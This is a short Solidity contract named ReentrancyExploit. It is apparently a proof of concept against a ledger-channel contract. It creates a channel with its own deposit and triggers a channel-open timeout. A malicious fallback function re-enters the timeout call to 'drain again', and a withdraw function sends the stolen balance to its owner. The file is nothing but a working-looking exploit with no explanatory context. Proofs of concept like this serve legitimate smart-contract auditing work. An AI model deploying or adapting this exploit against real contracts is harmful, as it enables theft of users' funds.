pragma solidity ^0.4.23;

interface ILedgerChannel {
    function createChannel(bytes32 _lcID, address _partyI, uint256 _confirmTime, address _token, uint256[2] _balances) external payable;
    function LCOpenTimeout(bytes32 _lcID) external;
}

contract ReentrancyExploit {
    ILedgerChannel public ledger;
    bytes32 public targetChannel;
    address public owner;
    bool public hasReentered;

    constructor(address _ledgerAddress) public {
        ledger = ILedgerChannel(_ledgerAddress);
        owner = msg.sender;
    }

    function attack(bytes32 _lcID, address _token, address _partyI) public payable {
        require(msg.sender == owner);
        targetChannel = _lcID;

        // Step 1: Create channel with this contract as partyA
        uint256[2] memory balances = [msg.value, uint256(0)];
        ledger.createChannel.value(msg.value)(_lcID, _partyI, 1, _token, balances);
    }

    function triggerTimeout() public {
        ledger.LCOpenTimeout(targetChannel);
    }

    // malicious fallback to reenter
    function () public payable {
        if (!hasReentered) {
            hasReentered = true;
            ledger.LCOpenTimeout(targetChannel);  // reenter and drain again
        }
    }

    function withdraw() public {
        require(msg.sender == owner);
        owner.transfer(address(this).balance);
    }
}

